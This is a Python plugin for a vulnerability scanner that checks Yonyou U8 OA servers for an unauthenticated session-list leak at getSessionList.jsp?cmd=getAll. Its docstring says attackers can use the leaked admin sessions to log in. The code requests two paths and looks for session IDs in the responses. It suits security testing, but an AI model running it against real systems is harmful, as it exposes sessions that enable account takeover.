#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
用友U8 OA getSessionList.jsp 敏感信息泄漏
    暂无编号
        Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

通过该漏洞, 攻击者可以获取数据库中管理员的账户信息以及session, 可利用session登录相关账号
'''

import re
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'yyoa/ext/https/getSessionList.jsp?cmd=getAll'},
            {'path': 'getSessionList.jsp?cmd=getAll'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')

        vul_info = {
        'app_name': 'Yonyou-U8-OA',
        'vul_type': 'DSinfo',
        'vul_id': 'Yonyou-u8-getSessionList-unAuth',
        }

        for payload in self.payloads:
            path = payload['path']

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            session_re = r'([0-9A-Z]{32})+'
            if (re.search(session_re, res.text, re.M|re.U)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
